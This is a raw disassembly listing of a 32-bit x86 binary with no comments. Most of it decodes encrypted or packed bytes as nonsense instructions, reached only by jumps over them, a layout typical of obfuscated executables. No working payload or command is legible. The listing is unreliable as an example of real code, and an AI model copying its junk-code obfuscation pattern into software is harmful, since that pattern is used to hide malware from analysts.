  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	or     ah,dl
  404a8d:	fs mov ch,0x47
  404a90:	and    eax,0x7c917e7e
  404a95:	jle    0x404b15
  404a97:	pop    eax
  404a98:	mov    cl,BYTE PTR [ecx-0x1bde9f3f]
  404a9e:	jge    0x404ac0
  404aa0:	mov    dh,0x2a
  404aa2:	or     esi,DWORD PTR [ecx-0x67]
  404aa5:	pop    ebx
  404aa6:	jmp    0x1926e6f0
  404aab:	hlt    
  404aac:	xchg   edx,eax
  404aad:	jmp    0xc3fae5cc
  404ab2:	jo     0x404afa
  404ab4:	repz test BYTE PTR gs:[eax-0x77],bl
  404ab9:	ss in  eax,dx
  404abb:	cmp    al,0x4
  404abd:	popa   
  404abe:	sub    al,0xc2
  404ac0:	jno    0x404aff
  404ac2:	push   ebx
  404ac3:	pusha  
  404ac4:	sbb    eax,0xf14fe39a
  404ac9:	xor    al,0xaf
  404acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404acc:	aam    0xd3
  404ace:	fcomi  st,st(4)
  404ad0:	pop    eax
  404ad1:	push   ss
  404ad2:	jae    0x404a8d
  404ad4:	push   cs
  404ad5:	popa   
  404ad6:	sbb    eax,0x4debe253
  404adb:	in     eax,dx
  404adc:	ja     0x404b52
  404ade:	pop    ds
  404adf:	cli    
  404ae0:	pop    edx
  404ae1:	mov    cl,0x96
  404ae3:	ja     0x404a6a
  404ae5:	popf   
  404ae6:	in     al,0x1e
  404ae8:	sar    al,0x7e
  404aeb:	xor    al,0x83
  404aed:	loopne 0x404b62
  404aef:	jns    0x404a97
  404af1:	jno    0x404abd
  404af3:	push   0x4c
  404af5:	daa    
  404af6:	loopne 0x404a8a
  404af8:	jecxz  0x404b01
  404afa:	out    dx,al
  404afb:	into   
  404afc:	mov    dh,0x4c
  404afe:	(bad)  
  404b00:	je     0x404ab5
  404b02:	jae    0x404aac
  404b04:	in     eax,dx
  404b05:	mov    esi,0xf4da600d
  404b0a:	icebp  
  404b0b:	call   0x8f55:0xfa8cde59
  404b12:	sti    
  404b13:	call   edi
  404b15:	lds    ebx,FWORD PTR [eax]
  404b17:	(bad)  
  404b18:	or     al,0xcf
  404b1a:	scas   eax,DWORD PTR es:[edi]
  404b1b:	je     0x404adc
  404b1d:	jmp    0x404ac8
  404b1f:	and    dh,ah
  404b21:	push   ss
  404b22:	lahf   
  404b23:	aas    
  404b24:	jge    0x404af0
  404b26:	mov    ds:0xff1413aa,al
  404b2b:	je     0x404aee
  404b2d:	jnp    0x404abc
  404b2f:	push   ds
  404b30:	outs   dx,BYTE PTR ds:[esi]
  404b31:	stos   BYTE PTR es:[edi],al
  404b32:	and    edi,DWORD PTR [ebx]
  404b34:	rcr    al,0x31
  404b37:	and    DWORD PTR [ecx+0x7d],0x3f
  404b3b:	dec    edx
  404b3c:	inc    esp
  404b3d:	inc    ecx
  404b3e:	stc    
  404b3f:	fldenv [edx+0x1ad10872]
  404b45:	lahf   
  404b46:	or     al,BYTE PTR [edi+0x1e]
  404b49:	mov    ch,0x1
  404b4b:	xchg   edi,eax
  404b4d:	dec    esp
  404b4e:	mov    ecx,0xaa372468
  404b53:	inc    edx
  404b54:	inc    ebp
  404b55:	data16 in al,dx
  404b57:	cdq    
  404b58:	in     eax,dx
  404b59:	inc    esi
  404b5a:	cdq    
  404b5b:	out    0xe1,eax
  404b5d:	and    eax,0xb5395a37
  404b62:	pop    ebx
  404b63:	imul   esi,DWORD PTR [ebx],0x70
  404b66:	adc    al,BYTE PTR [ebp-0x845dcc9]
  404b6c:	call   0x4ed15daa
  404b71:	mov    ecx,0xb05b9d36
  404b76:	and    ebx,0xd4108a7d
  404b7c:	cs xchg ecx,eax
  404b7e:	cmp    al,0x93
  404b80:	jne    0x404b40
  404b82:	in     eax,dx
  404b83:	xor    DWORD PTR [esi],0x43
  404b86:	mov    bl,0x7a
  404b88:	cwde   
  404b89:	clc    
  404b8a:	addr16 mov edx,0x482dcdeb
  404b90:	or     BYTE PTR [ebx-0x4c140247],bh
  404b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b97:	jbe    0x404baa
  404b99:	arpl   WORD PTR [eax-0x1f4f5be3],cx
  404b9f:	mov    eax,ds:0xe3e6634c
  404ba4:	pushf  
  404ba5:	sahf   
  404ba6:	sub    al,BYTE PTR [eax]
  404ba8:	ret    0x345d
  404bab:	cmp    eax,0x89914efc
  404bb0:	iret   
  404bb1:	sbb    esp,edx
  404bb3:	fcomp  DWORD PTR [eax-0x65]
  404bb6:	shr    BYTE PTR [edi],0x16
  404bb9:	bound  ecx,QWORD PTR [ebp-0x3]
  404bbc:	cs mov edx,0xcdbbf51e
  404bc2:	iret   
  404bc3:	in     al,dx
  404bc4:	sub    ebx,ebx
  404bc6:	dec    edi
  404bc7:	and    al,0xaf
  404bc9:	jmp    0xb3ab6ac8
  404bce:	mov    al,ds:0x79eb12b5
  404bd3:	and    BYTE PTR es:[ecx],dl
  404bd6:	(bad)  
  404bd7:	lea    edi,ds:0x5865ebbc
  404bdd:	push   ecx
  404bde:	rol    eax,1
  404be0:	inc    ecx
  404be1:	xchg   esi,eax
  404be2:	retf   0x2a0
  404be5:	lea    ebx,[ebp-0x5a7d562d]
  404beb:	into   
  404bec:	jecxz  0x404c4c
  404bee:	loope  0x404bcb
  404bf0:	test   DWORD PTR [eax-0x72],0xebe72d28
  404bf7:	add    DWORD PTR [eax],edx
  404bf9:	clc    
  404bfa:	mov    ch,0x6f
  404bfc:	inc    ebp
  404bfd:	mov    WORD PTR [ecx],ds
  404bff:	mov    al,0x71
  404c01:	lods   al,BYTE PTR ds:[esi]
  404c02:	lods   al,BYTE PTR ds:[esi]
  404c03:	or     eax,0xdae9d738
  404c08:	xchg   edi,eax
  404c09:	shr    BYTE PTR [eax],1
  404c0b:	pop    ds
  404c0c:	lods   eax,DWORD PTR ss:[esi]
  404c0e:	push   eax
  404c0f:	xchg   edi,eax
  404c10:	jbe    0x404c3b
  404c12:	pop    esi
  404c13:	int    0x38
  404c15:	dec    esp
  404c16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c17:	scas   al,BYTE PTR es:[edi]
  404c18:	scas   al,BYTE PTR es:[edi]
  404c19:	mov    dh,bh
  404c1b:	jg     0x404bb9
  404c1d:	ror    ah,0x37
  404c20:	cmp    DWORD PTR [eax+edi*8],ecx
  404c23:	outs   dx,DWORD PTR es:[esi]
  404c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c26:	sbb    al,0x91
  404c28:	mov    dh,0xc3
  404c2a:	mov    BYTE PTR [esi],ah
  404c2c:	mov    eax,ds:0x5d8e5a6a
  404c31:	mov    bl,BYTE PTR [edx]
  404c33:	mov    edx,0xef87b27
  404c38:	into   
  404c39:	int    0x36
  404c3b:	fist   WORD PTR [edi]
  404c3d:	xchg   ebp,eax
  404c3e:	jne    0x404ca6
  404c40:	int3   
  404c41:	add    ecx,0x738a8669
  404c47:	sbb    BYTE PTR [eax+esi*8-0x50d3ba5d],bl
  404c4e:	mov    ds:0xb5ec54eb,eax
  404c53:	test   eax,0x4c505e7d
  404c58:	mov    bl,0x63
  404c5a:	iret   
  404c5b:	call   FWORD PTR [edx]
  404c5d:	adc    DWORD PTR es:[eax],esi
  404c60:	loope  0x404c79
  404c62:	shld   DWORD PTR [ebx+0x2b],ecx,cl
  404c66:	xchg   BYTE PTR [eax+eax*4-0x5ded1987],bl
  404c6d:	pop    edi
  404c6e:	pushf  
  404c6f:	xchg   esp,eax
  404c70:	gs sub al,0xcf
  404c73:	sbb    dh,BYTE PTR [edx+0x58fe355e]
  404c79:	mov    edx,0xad3db628
  404c7e:	clc    
  404c7f:	inc    ebx
  404c80:	rcr    BYTE PTR [edi],1
  404c82:	xchg   ebp,eax
  404c83:	pop    ss
  404c84:	shl    BYTE PTR [edx+0x50eb1cc],0x11
  404c8b:	mov    al,ds:0xea0a9642
  404c90:	daa    
  404c91:	in     eax,0x66
  404c93:	cmp    BYTE PTR [edx],ah
  404c95:	dec    esp
  404c96:	inc    esi
  404c97:	out    0xbf,eax
  404c99:	fst    QWORD PTR [edx]
  404c9b:	ja     0x404c61
  404c9d:	out    0x51,al
  404c9f:	adc    esi,DWORD PTR [edx-0x1a]
  404ca2:	pop    ds
  404ca3:	mov    edx,0x343b3a0e
  404ca8:	das    
  404ca9:	mov    al,ds:0x5432a153
  404cae:	out    dx,al
  404caf:	je     0x404c8c
  404cb1:	jns    0x404c41
  404cb3:	enter  0xc4ff,0xd5
  404cb7:	jnp    0x404c49
  404cb9:	icebp  
  404cba:	add    ah,dh
  404cbc:	dec    esp
  404cbd:	retf   
  404cbe:	nop
  404cbf:	cli    
  404cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cc1:	test   edx,0xf860bf69
  404cc7:	ins    BYTE PTR es:[edi],dx
  404cc8:	xlat   BYTE PTR ds:[ebx]
  404cc9:	shl    BYTE PTR [ecx-0x12],1
  404ccc:	loope  0x404c50
  404cce:	repnz test BYTE PTR [eiz*8-0x47cebbc],ch
  404cd6:	mov    ds:0x81ddf49,eax
  404cdb:	pop    ebp
  404cdc:	pushf  
  404cdd:	cmc    
  404cde:	mov    al,ds:0x5f5b45f2
  404ce3:	imul   esi,DWORD PTR [ebp+0x3a],0x1454de9c
  404cea:	xchg   ebx,eax
  404ceb:	inc    edi
  404cec:	ins    BYTE PTR es:[edi],dx
  404ced:	push   ss
  404cee:	jle    0x404d2c
  404cf0:	scas   eax,DWORD PTR es:[edi]
  404cf1:	inc    ebx
  404cf2:	in     eax,dx
  404cf3:	fidivr WORD PTR [edi]
  404cf5:	out    dx,eax
  404cf6:	popf   
  404cf7:	inc    edi
  404cf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cf9:	cmp    BYTE PTR [ebx+0x13],bh
  404cfc:	scas   eax,DWORD PTR es:[edi]
  404cfd:	(bad)  [edx]
  404cff:	mov    ah,0x83
  404d01:	mov    al,ds:0x67a48ff2
  404d06:	sbb    DWORD PTR [edi-0x61],ebx
  404d09:	jmp    0x1179ca87
  404d0e:	push   es
  404d0f:	pop    edx
  404d10:	stos   BYTE PTR es:[edi],al
  404d11:	sub    BYTE PTR [ebx+edi*1+0x3b],0x1e
  404d16:	sahf   
  404d17:	pop    eax
  404d18:	clc    
  404d19:	(bad)  
  404d1a:	cld    
  404d1b:	ret    0xfbd3
  404d1e:	jbe    0x404d90
  404d20:	inc    ebx
  404d21:	outs   dx,BYTE PTR ds:[esi]
  404d22:	push   esi
  404d23:	push   esi
  404d24:	jae    0x404d3e
  404d26:	ret    0x6d60
  404d29:	xchg   esi,eax
  404d2a:	mov    es,WORD PTR [edi+0x1247e59d]
  404d30:	(bad)  
  404d31:	adc    al,dl
  404d33:	xchg   esp,eax
  404d34:	xor    eax,0x8bf1f75f
  404d39:	dec    ebp
  404d3a:	adc    BYTE PTR [ebx],ah
  404d3c:	enter  0xc981,0x8f
  404d40:	sbb    eax,0xc18b8116
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0x6a54024b
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404d82
  404d6a:	pop    esp
  404d6b:	(bad)  
  404d6c:	rcr    DWORD PTR [edx-0x555e8f0f],cl
  404d72:	inc    edi
  404d73:	daa    
  404d74:	jne    0x404db6
  404d76:	out    0x49,al
  404d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d79:	push   ss
  404d7a:	jg     0x404d12
  404d7c:	repz dec ebx
  404d7e:	loop   0x404d10
  404d80:	fsubrp st(3),st
  404d82:	daa    
  404d83:	add    bh,BYTE PTR [ebx-0x5ae3e5c]
  404d89:	sub    dh,BYTE PTR ds:0x7e10595b
  404d8f:	push   ebp
  404d90:	(bad)  
  404d91:	fnstcw WORD PTR [ecx+0xde1b400]
  404d97:	or     esi,DWORD PTR [ebx+0x3f]
  404d9a:	jne    0x404d78
  404d9c:	xchg   edi,eax
  404d9d:	xchg   esp,eax
  404d9e:	neg    DWORD PTR [eax]
  404da0:	ds stos DWORD PTR es:[di],eax
  404da3:	mov    ds:0xde62f3b9,al
  404da8:	pusha  
  404da9:	sbb    BYTE PTR ds:0x11c01561,0xfb
  404db0:	popf   
  404db1:	adc    eax,0xda72ef00
  404db6:	mov    ecx,0xef3f8b5a
  404dbb:	ficomp WORD PTR [esi]
  404dbd:	in     al,dx
  404dbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dbf:	dec    ebp
  404dc0:	cmp    esp,DWORD PTR ds:0xcb1b91c2
  404dc6:	xchg   edx,eax
  404dc7:	xchg   ebx,eax
  404dc8:	xor    al,0xc6
  404dca:	cmp    eax,0xef74944a
  404dcf:	scas   al,BYTE PTR es:[edi]
  404dd0:	in     al,0x23
  404dd2:	call   0xacc80ea0
  404dd7:	ret    0xd03f
  404dda:	inc    edi
  404ddb:	jno    0x404d91
  404ddd:	or     al,0x9d
  404ddf:	push   ss
  404de0:	js     0x404d85
  404de2:	jl     0x404e4d
  404de4:	mov    edi,0xe0d21305
  404de9:	mov    ds:0x5363083c,eax
  404dee:	das    
  404def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404df0:	dec    esi
  404df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404df2:	scas   al,BYTE PTR es:[edi]
  404df3:	dec    edx
  404df4:	push   esp
  404df5:	cmc    
  404df6:	xchg   BYTE PTR [ecx],ch
  404df8:	retf   0x60b6
  404dfb:	sub    BYTE PTR [edx],0x21
  404dfe:	and    esp,DWORD PTR [edx+0x47]
  404e01:	adc    ecx,DWORD PTR [ebp-0x10]
  404e04:	into   
  404e05:	xor    cl,BYTE PTR [edi+esi*1+0x17a573fa]
  404e0c:	push   edx
  404e0d:	push   0x27e2dda7
  404e12:	test   al,0xb1
  404e14:	sbb    BYTE PTR [eax-0x1c3aebd1],dl
  404e1a:	and    DWORD PTR [ecx-0x9c53c2a],ebx
  404e20:	mov    esi,0x6cb26731
  404e25:	ins    DWORD PTR es:[edi],dx
  404e26:	call   0x2bc14eae
  404e2b:	sub    eax,0xa024f78d
  404e30:	inc    esp
  404e31:	fcomp  QWORD PTR [ecx+0x76]
  404e34:	stos   BYTE PTR es:[edi],al
  404e35:	cmp    BYTE PTR [edi+ebx*1+0x4634e210],0xd3
  404e3d:	push   ebx
  404e3e:	imul   ebp,DWORD PTR [ecx],0x12
  404e41:	scas   al,BYTE PTR es:[edi]
  404e42:	es pop ecx
  404e44:	and    esi,ebp
  404e46:	(bad)  [edi+ebp*1-0x10]
  404e4a:	ret    
  404e4b:	ret    0xb2df
  404e4e:	xchg   DWORD PTR [esi],edi
  404e50:	sbb    al,0x74
  404e52:	je     0x404de0
  404e54:	or     esp,edx
  404e56:	sbb    edi,DWORD PTR [esi+0x33]
  404e59:	inc    edx
  404e5a:	push   edx
  404e5b:	mov    BYTE PTR [edi+0x47038b03],ah
  404e61:	pop    ebx
  404e62:	sub    eax,0x43abe680
  404e67:	dec    edi
  404e68:	cwde   
  404e69:	jmp    0x404e82
  404e6b:	adc    al,0xdc
  404e6d:	outs   dx,DWORD PTR ds:[esi]
  404e6e:	js     0x404df0
  404e70:	test   edi,esp
  404e72:	pop    eax
  404e73:	adc    al,0x78
  404e75:	test   ecx,edx
  404e77:	pop    es
  404e78:	inc    ebp
  404e79:	or     cl,dh
  404e7b:	hlt    
  404e7c:	xor    ch,BYTE PTR [edx-0x56]
  404e7f:	lahf   
  404e80:	in     eax,0x73
  404e82:	mov    dh,0xf3
  404e84:	scas   al,BYTE PTR es:[edi]
  404e85:	inc    esp
  404e86:	data16 or BYTE PTR fs:[edx+ebx*4+0x554f3e3b],bh
  404e8f:	std    
  404e90:	mov    eax,ds:0xa3d410fd
  404e95:	aas    
  404e96:	fidivr DWORD PTR [ecx]
  404e98:	sub    ebp,DWORD PTR [esi+0x6061090e]
  404e9e:	stc    
  404e9f:	rcr    BYTE PTR [ebx],0x84
  404ea2:	jo     0x404ef1
  404ea4:	mov    ah,BYTE PTR [ebx+esi*4+0x19078027]
  404eab:	repz aas 
  404ead:	mov    esp,0x7bb045df
  404eb2:	xor    DWORD PTR [ebp+0x2e],ecx
  404eb5:	lock int3 
  404eb7:	cs nop
  404eb9:	inc    esp
  404eba:	sahf   
  404ebb:	out    0xed,al
  404ebd:	and    ebx,DWORD PTR [eax]
  404ebf:	(bad)  
  404ec0:	push   es
  404ec1:	pop    ecx
  404ec2:	xchg   edx,eax
  404ec3:	dec    ecx
  404ec4:	(bad)  
  404ec5:	adc    eax,ecx
  404ec7:	sti    
  404ec8:	mov    ah,0xbd
  404eca:	mov    eax,0xc81138f7
  404ecf:	ins    BYTE PTR es:[edi],dx
  404ed0:	adc    esp,eax
  404ed2:	adc    ebx,ebx
  404ed4:	ins    BYTE PTR es:[edi],dx
  404ed5:	mov    ebp,0x4c5d186a
  404eda:	dec    ecx
  404edb:	leave  
  404edc:	ins    DWORD PTR es:[edi],dx
  404edd:	adc    DWORD PTR [ebx+0x76],edx
  404ee0:	jae    0x404f5d
  404ee2:	int3   
  404ee3:	mov    ecx,0x86ce3859
  404ee8:	xchg   DWORD PTR [ecx+0x5d],ebp
  404eeb:	aad    0xf0
  404eed:	push   cs
  404eee:	mov    eax,0x11d4c295
  404ef3:	fistp  DWORD PTR [eax+edi*2+0x1c]
  404ef7:	push   ds
  404ef8:	ins    DWORD PTR es:[edi],dx
  404ef9:	xor    al,0x9b
  404efb:	ss push edi
  404efd:	add    ch,BYTE PTR [ecx-0x29]
  404f00:	clc    
  404f01:	test   al,0x4
  404f03:	inc    esi
  404f04:	jg     0x404f17
  404f06:	icebp  
  404f07:	push   esp
  404f08:	iret   
  404f09:	(bad)  
  404f0a:	mov    dh,0xec
  404f0c:	call   0x2ce16ab6
  404f11:	mov    edx,0xb0d763b5
  404f16:	xchg   ebp,eax
  404f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f18:	dec    ecx
  404f19:	shl    dl,0x7c
  404f1c:	inc    ebp
  404f1d:	or     DWORD PTR [edx-0x80],ebp
  404f20:	adc    DWORD PTR [ebp-0x29769ea4],esi
  404f26:	push   edi
  404f27:	test   BYTE PTR [edx-0x6f],dl
  404f2a:	ds (bad) 
  404f2d:	cs addr16 mov bh,0x2a
  404f31:	jg     0x404f1a
  404f33:	fwait
  404f34:	push   eax
  404f35:	mul    al
  404f37:	xor    cl,BYTE PTR [edi]
  404f39:	das    
  404f3a:	inc    ebp
  404f3b:	loop   0x404efd
  404f3d:	inc    ecx
  404f3e:	jb     0x404fbc
  404f40:	aas    
  404f41:	xor    eax,0x47dbee5
  404f46:	pop    eax
  404f47:	mov    ebx,0xb2354d0b
  404f4c:	mov    dl,0xbc
  404f4e:	push   0x4defcdf5
  404f53:	sar    bh,0xec
  404f56:	(bad)  
  404f57:	mov    eax,ds:0x258151f6
  404f5c:	fld    DWORD PTR [edx]
  404f5e:	inc    ebx
  404f5f:	add    BYTE PTR [eax],al
  404f61:	add    BYTE PTR [eax],al
  404f63:	add    cl,ch
  404f65:	or     eax,DWORD PTR [eax]
  404f67:	add    BYTE PTR [eax],al
  404f69:	mov    eax,ds:0x4302d9
  404f6e:	inc    eax
  404f6f:	mov    ds:0x4302d9,eax
  404f74:	cmp    DWORD PTR ds:0x4302d9,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x4302d9,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e654
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42e91f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42ec57
  404faf:	xor    edx,DWORD PTR ds:0x4302d1
  404fb5:	mov    DWORD PTR ds:0x42ec57,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ece9
  404fc8:	mov    eax,ds:0x42e803
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e658
  404fdc:	sub    ecx,DWORD PTR ds:0x4302cd
  404fe2:	mov    DWORD PTR ds:0x42e658,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42ec73,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42ec73
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42ec73,ecx
  405002:	cmp    DWORD PTR ds:0x42ec73,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e853
  405018:	cmp    DWORD PTR ds:0x42ec73,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42ec73
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42ec73,ecx
  405034:	cmp    DWORD PTR ds:0x42ec73,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	aas    
  405053:	das    
  405054:	neg    BYTE PTR [ebp+0x7e7e2ed6]
  40505a:	outs   dx,BYTE PTR ds:[esi]
  40505b:	jg     0x4050db
  40505d:	jle    0x40501e
  40505f:	sar    dl,1
  405061:	and    bl,BYTE PTR [ecx]
  405063:	add    DWORD PTR [ecx+eiz*4-0x79],ebp
  405067:	and    BYTE PTR [edi+0x12],al
  40506a:	jno    0x405089
  40506c:	out    0xe1,eax
  40506e:	sti    
  40506f:	mov    edx,0x132a2d0c
  405074:	addr16 je 0x405040
  405077:	iret   
  405078:	xor    al,0xac
  40507a:	lds    ebx,FWORD PTR [ebx+0x275df602]
  405080:	dec    ebx
  405081:	dec    edx
  405082:	cmp    ebx,ebx
  405084:	mov    ebx,DWORD PTR [eax-0x41a8b000]
  40508a:	dec    edi
  40508b:	and    esp,DWORD PTR [esi+0x8e83d52]
  405091:	xchg   esi,eax
  405092:	in     al,0xbc
  405094:	push   edi
  405095:	adc    eax,edi
  405097:	xchg   esi,eax
  405098:	add    eax,0x5e30b16
  40509d:	or     al,0x9d
  40509f:	sub    eax,0x7d890832
  4050a4:	xor    BYTE PTR [edi+eax*2+0x68],bh
  4050a8:	pop    edx
  4050a9:	test   eax,0x552f0057
  4050ae:	ds out 0x34,eax
  4050b1:	daa    
  4050b2:	stos   BYTE PTR es:[edi],al
  4050b3:	pop    edi
  4050b4:	stos   DWORD PTR es:[edi],eax
  4050b5:	or     bh,BYTE PTR [ecx]
  4050b7:	pop    ss
  4050b8:	adc    DWORD PTR [esi+0x7a],0xaf4071dc
  4050bf:	stos   BYTE PTR es:[edi],al
  4050c0:	push   es
  4050c1:	adc    al,cl
  4050c3:	xchg   ebp,esp
  4050c5:	mov    ch,0x97
  4050c7:	or     bl,ch
  4050c9:	mov    cl,0xe1
  4050cb:	stc    
  4050cc:	sbb    DWORD PTR [edi+0x43323852],eax
  4050d2:	cmp    ebx,edx
  4050d4:	in     al,0x9
  4050d6:	or     dh,0x9
  4050d9:	mov    al,ds:0x27d68d7b
  4050de:	arpl   ax,bp
  4050e0:	sahf   
  4050e1:	mov    DWORD PTR [edi+0x23cea6d6],ebp
  4050e7:	add    eax,0x2bbfeece
  4050ec:	and    al,0x17
  4050ee:	push   edi
  4050ef:	push   cs
  4050f0:	ds pop ecx
  4050f2:	adc    eax,0xad418462
  4050f7:	loope  0x4050fc
  4050f9:	into   
  4050fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050fb:	push   0x3
  4050fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050fe:	aam    0xbf
  405100:	inc    ebp
  405101:	call   FWORD PTR [edx]
  405103:	fisub  WORD PTR [ebp-0x35b94e20]
  405109:	sub    bh,BYTE PTR [esi+ecx*4+0x8]
  40510d:	ret    0x7e7d
  405110:	sub    dl,BYTE PTR [edi+0x3f]
  405113:	scas   al,BYTE PTR es:[edi]
  405114:	jnp    0x405134
  405116:	push   ebx
  405117:	fmul   st,st(0)
  405119:	fistp  DWORD PTR [ebp+0x319b4b58]
  40511f:	jle    0x40519c
  405121:	pop    ds
  405122:	out    dx,eax
  405123:	addr16 icebp 
  405125:	jbe    0x405121
  405127:	mov    dl,0x2b
  405129:	(bad)  
  40512a:	pop    edx
  40512b:	mov    edi,0x7f298f65
  405130:	call   0xdcdb202a
  405135:	shr    ebp,0x6
  405138:	push   esp
  405139:	dec    ebx
  40513a:	pop    ebx
  40513b:	mov    ah,0x51
  40513d:	js     0x4050df
  40513f:	jecxz  0x405172
  405141:	in     eax,0x84
  405143:	jl     0x4051be
  405145:	cmp    ebx,eax
  405147:	mov    WORD PTR [ebp-0x3d],gs
  40514a:	push   edi
  40514b:	or     eax,0x5261dc33
  405150:	fld    QWORD PTR [edx+esi*8]
  405153:	or     DWORD PTR [edx],ebp
  405155:	push   ebp
  405156:	out    dx,al
  405157:	sbb    edx,DWORD PTR [ebx+0x5f]
  40515a:	xor    BYTE PTR [ecx-0x40],bh
  40515d:	enter  0x1308,0x9d
  405161:	jae    0x40517c
  405163:	push   eax
  405164:	out    0xe6,eax
  405166:	rol    BYTE PTR [eax],0x34
  405169:	or     BYTE PTR [eax+0xb8dc0a2],0xa3
  405170:	jae    0x4050f8
  405172:	pop    ds
  405173:	xor    DWORD PTR [ebp+0x413074f0],ebp
  405179:	pop    edx
  40517a:	ret    0x5952
  40517d:	xchg   BYTE PTR [edi-0x621dbb28],ch
  405183:	sar    BYTE PTR [edi+0x3722b2b9],0xd4
  40518a:	imul   esp,DWORD PTR [edx-0x24b04262],0xffffffc1
  405191:	push   cs
  405192:	jb     0x405155
  405194:	test   al,0xa6
  405196:	sbb    BYTE PTR [edi+0x4d1d9cfb],bh
  40519c:	and    BYTE PTR [ebp-0x512e960e],ch
  4051a2:	mov    cl,0x18
  4051a4:	sbb    DWORD PTR [esi],eax
  4051a6:	xchg   BYTE PTR [ecx+ecx*8],dh
  4051a9:	push   eax
  4051aa:	push   ecx
  4051ab:	inc    edi
  4051ac:	mov    ds:0xf842dfdf,eax
  4051b1:	sbb    eax,0x6e
  4051b4:	mov    ds:0xd6a95634,eax
  4051b9:	loope  0x4051b4
  4051bb:	outs   dx,DWORD PTR ds:[esi]
  4051bc:	sbb    eax,0x13e26d12
  4051c1:	int    0xa5
  4051c3:	add    eax,esp
  4051c5:	push   cs
  4051c6:	ret    
  4051c7:	jmp    DWORD PTR [esi+eax*8+0x3cba0d05]
  4051ce:	add    eax,0x859a9425
  4051d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051d4:	jo     0x4051d2
  4051d6:	mov    ebx,0x38892d3d
  4051db:	sub    DWORD PTR [ebx],edx
  4051dd:	xchg   esp,eax
  4051de:	dec    ecx
  4051df:	jb     0x40516c
  4051e1:	pop    ds
  4051e2:	dec    esp
  4051e3:	mov    ecx,edx
  4051e5:	inc    esp
  4051e6:	inc    ecx
  4051e7:	mov    dh,0x5f
  4051e9:	push   ds
  4051ea:	sbb    esi,DWORD PTR [eax+0x616fab2c]
  4051f0:	jno    0x405261
  4051f2:	pusha  
  4051f3:	sub    eax,0xeae1f1fe
  4051f8:	mov    ebp,0xda3d3e5b
  4051fd:	jg     0x4051fd
  4051ff:	inc    esp
  405200:	je     0x405191
  405202:	dec    edx
  405203:	(bad)  
  405204:	dec    esi
  405205:	push   0xffffff96
  405207:	imul   esi,ecx,0xb042f851
  40520d:	xchg   ebp,eax
  40520e:	xor    eax,0xc4425d92
  405213:	xor    dl,BYTE PTR [esi+0x56]
  405216:	js     0x405225
  405218:	fmul   DWORD PTR [ecx-0x3d8bd791]
  40521e:	adc    al,0x37
  405220:	pop    ecx
  405221:	fidivr WORD PTR [edx]
  405223:	cdq    
  405224:	xlat   BYTE PTR ds:[ebx]
  405225:	cmp    cl,BYTE PTR [eax-0x2645c680]
  40522b:	das    
  40522c:	inc    esp
  40522d:	and    al,0x48
  40522f:	lds    sp,DWORD PTR [edx+0xe]
  405233:	(bad)  
  405234:	dec    esi
  405235:	xchg   BYTE PTR [ebx],ch
  405237:	es jmp 0x9974:0xc4ab9b71
  40523f:	aad    0x34
  405241:	xchg   edx,eax
  405242:	sahf   
  405243:	or     DWORD PTR [esi+eiz*2+0x40],0x2b
  405248:	xor    al,BYTE PTR [ebp-0x74]
